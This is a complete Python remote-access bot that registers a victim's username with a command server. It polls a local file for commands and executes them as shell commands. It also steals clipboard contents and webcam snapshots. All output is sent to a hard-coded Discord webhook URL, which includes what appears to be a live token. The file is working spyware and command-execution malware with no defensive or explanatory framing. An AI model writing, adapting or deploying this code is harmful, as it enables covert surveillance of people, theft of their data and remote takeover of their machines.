import time
import subprocess
import pyperclip
import cv2
import requests
import os
import getpass

BOT_SERVER_URL = "http://10.0.2.15:4444/register"
WEBHOOK_URL = "https://discord.com/api/webhooks/1378728114154373210/dbYW6CSsPhT8pv1odE068pmWc6AMsR9PRwq0kYHnD861qcczg6Gladk_aXWCtNwtigj3"
TEMP_IMG = "/tmp/webcam.jpg"

last_command = ""
username = getpass.getuser()
COMMAND_FILE = f"commands/{username}.txt"

def register():
    try:
        requests.post(BOT_SERVER_URL, json={"username": username})
    except Exception as e:
        print(f"[!] Failed to register: {e}")

def send_to_discord(message=None, file_path=None):
    data = {"content": message} if message else {}
    files = {"file": open(file_path, "rb")} if file_path else None
    try:
        requests.post(WEBHOOK_URL, data=data, files=files)
    except Exception as e:
        print(f"[!] Webhook failed: {e}")

def handle_command(cmd):
    if cmd == "clipboard":
        try:
            clip = pyperclip.paste()
            send_to_discord(f"📋 Clipboard: `{clip}`")
        except Exception as e:
            send_to_discord(f"[!] Clipboard error: {e}")
    elif cmd == "webcam":
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                cv2.imwrite(TEMP_IMG, frame)
                send_to_discord(file_path=TEMP_IMG)
            else:
                send_to_discord("[!] Webcam not available")
            cap.release()
        except Exception as e:
            send_to_discord(f"[!] Webcam error: {e}")
    else:
        try:
            result = subprocess.getoutput(cmd)
            if result:
                send_to_discord(f"🖥️ Result:\n```{result[:1900]}```")
            else:
                send_to_discord("✅ Command ran, no output.")
        except Exception as e:
            send_to_discord(f"[!] Command error: {e}")

def main():
    global last_command
    register()  # register once at start

    while True:
        try:
            if os.path.exists(COMMAND_FILE):
                with open(COMMAND_FILE, "r") as f:
                    cmd = f.read().strip()
                if cmd and cmd != last_command:
                    print(f"[*] New command: {cmd}")
                    last_command = cmd
                    handle_command(cmd)
        except Exception as e:
            print(f"[!] Error: {e}")
        time.sleep(5)

if __name__ == "__main__":
    main()

